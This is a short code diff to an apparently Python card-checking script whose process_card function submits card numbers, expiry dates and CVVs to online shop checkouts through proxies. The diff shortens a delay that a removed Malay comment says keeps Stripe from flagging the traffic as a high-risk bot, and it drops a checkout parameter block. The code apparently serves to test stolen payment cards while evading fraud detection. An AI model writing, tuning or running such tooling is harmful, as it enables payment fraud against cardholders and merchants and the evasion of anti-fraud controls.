@@ -476,8 +476,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 await queue.put({"type": "log", "msg": f"[ERROR STEP 6] Tokenization failed: {token_error}"})
                 return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
 
-            # DELAY ANTI-BOT 3 ke 5 saat supaya Stripe tak flag sebagai bot high-risk (Elak GENERIC_ERROR)
-            await asyncio.sleep(random.uniform(3.0, 5.0))
+            await asyncio.sleep(random.uniform(1.0, 2.0))
 
             await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
             graphql_url = f'{ourl}/checkouts/unstable/graphql'
@@ -647,11 +646,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                             'shippingScriptChanges': [],
                         },
                         'optionalDuties': {'buyerRefusesDuties': False},
-                        'negotiationStrategy': {
-                            'acceptedTerms': True,
-                            'acceptUnexpectedDiscounts': True,
-                            'acceptUnexpectedTaxes': True
-                        },
                     },
                     'attemptToken': f'{c_token}-{random.random()}',
                     'metafields': [],
